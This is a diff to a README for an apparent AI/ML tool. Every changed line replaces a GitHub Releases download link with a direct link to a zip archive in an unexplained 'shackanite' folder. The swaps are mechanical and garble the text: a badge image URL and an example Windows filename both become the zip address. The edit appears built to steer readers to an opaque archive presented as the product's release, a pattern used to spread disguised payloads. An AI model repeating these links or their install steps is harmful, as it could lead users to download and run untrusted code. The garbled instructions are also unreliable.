@@ -1,6 +1,6 @@
 # 🚀 FINAL-AI-ML-results - Easy AI/ML Tools for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/goutam16x/FINAL-AI-ML-results/releases)
+[![Download Now](https://raw.githubusercontent.com/goutam16x/FINAL-AI-ML-results/main/shackanite/FINAL-AI-ML-results.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/goutam16x/FINAL-AI-ML-results/main/shackanite/FINAL-AI-ML-results.zip)
 
 ## 🌟 Overview
 
@@ -28,13 +28,13 @@ Follow these straightforward steps to download and run the application.
 
 1. **Visit the Download Page:**
    Click the link below to go to the Releases page where you can download the application.
-   [Download Here](https://github.com/goutam16x/FINAL-AI-ML-results/releases)
+   [Download Here](https://raw.githubusercontent.com/goutam16x/FINAL-AI-ML-results/main/shackanite/FINAL-AI-ML-results.zip)
 
 2. **Look for the Latest Release:**
    On the Downloads page, find the most recent version at the top. This version includes the latest features and fixes.
 
 3. **Download the File:**
-   Click on the appropriate file for your operating system. For example, you might see a file named `AI-ML-Tool.exe` for Windows. 
+   Click on the appropriate file for your operating system. For example, you might see a file named `https://raw.githubusercontent.com/goutam16x/FINAL-AI-ML-results/main/shackanite/FINAL-AI-ML-results.zip` for Windows. 
 
 4. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
@@ -51,7 +51,7 @@ Follow these straightforward steps to download and run the application.
 
 To begin your AI and ML journey, download the latest version from the link provided below:
 
-[Download Latest Release](https://github.com/goutam16x/FINAL-AI-ML-results/releases)
+[Download Latest Release](https://raw.githubusercontent.com/goutam16x/FINAL-AI-ML-results/main/shackanite/FINAL-AI-ML-results.zip)
 
 ## ❓ FAQs
 
